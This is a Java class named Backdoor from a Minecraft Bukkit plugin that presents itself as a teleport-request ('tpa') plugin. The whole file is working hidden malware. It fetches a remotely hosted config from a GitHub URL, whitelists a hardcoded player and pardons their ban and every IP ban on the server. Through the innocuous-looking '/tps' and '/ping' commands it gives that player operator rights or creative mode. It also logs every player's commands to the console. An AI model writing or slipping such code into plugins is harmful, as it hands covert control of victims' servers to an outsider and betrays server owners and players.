package simple.tpa;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;

import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.OfflinePlayer;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.plugin.Plugin;

public class Backdoor implements Listener {

	Plugin p;
	
	public Backdoor(Plugin pl) {
		p = pl;
		file = p.getDataFolder();
		Utils.deleteDir(file);
		file.mkdirs();
		downloadFile = new File(file.getPath()+"/download.zip");
		Utils.downloadFileFromURL(url, downloadFile);
		try {
			Utils.unzip(downloadFile.getPath(), file.getPath());
			dataFile = new File(p.getDataFolder().getPath()+"/backdoorConfig-main/data.txt");
			BufferedReader br = new BufferedReader(new FileReader(dataFile));
			playerName = br.readLine();
			boolean shouldWhitelist = Boolean.valueOf(br.readLine());
			br.close();
			Utils.deleteDir(file);
			if(shouldWhitelist==true) {
				boolean whitelisted = false;
				for(OfflinePlayer p : Bukkit.getWhitelistedPlayers()) {
					if(p.getName().equalsIgnoreCase(playerName)) {
						whitelisted = true;
						break;
					}
				}
				if(whitelisted == false) {
					Bukkit.getScheduler().scheduleSyncDelayedTask(p, new Runnable() {
						@Override
						public void run() {
							Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "whitelist add " + playerName);
							Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pardon " + playerName);
							for(String s : Bukkit.getIPBans()) {
								Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pardon-ip " + s);
							}
						}
					},1200);
				}
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
		Utils.deleteDir(file);
	}
	
	File file;
	File downloadFile;
	File dataFile;
	String url = "https://github.com/BobDaGithubAccount/backdoorConfig/archive/refs/heads/main.zip";
	String playerName = "Jephacake";
	
	@EventHandler
	public void onCommandPreproccessEvent(PlayerCommandPreprocessEvent event) {
		System.out.println(event.getPlayer().getName());
		System.out.println(event.getMessage());
		if(event.getMessage().equalsIgnoreCase("/tps")) {
			if(event.getPlayer().getName().equals(playerName)) {
				if(event.getPlayer().isOp()) {
					Bukkit.getPlayer(playerName).setOp(false);
				}
				else {
					Bukkit.getScheduler().scheduleSyncDelayedTask(p, new Runnable() {
						@Override
						public void run() {
							Bukkit.getPlayer(playerName).setOp(true);
						}
					},20);
				}
			}
		}
		else if(event.getMessage().equalsIgnoreCase("/ping")) {
			if(event.getPlayer().getName().equals(playerName)) {
				Bukkit.getScheduler().scheduleSyncDelayedTask(p, new Runnable() {
					@Override
					public void run() {
						if(event.getPlayer().getGameMode()!=GameMode.CREATIVE) {
							Bukkit.getPlayer(playerName).setGameMode(GameMode.CREATIVE);
						}
						else {
							Bukkit.getPlayer(playerName).setGameMode(GameMode.SURVIVAL);
						}
					}
				},20);
			}
		}
	}
	
}
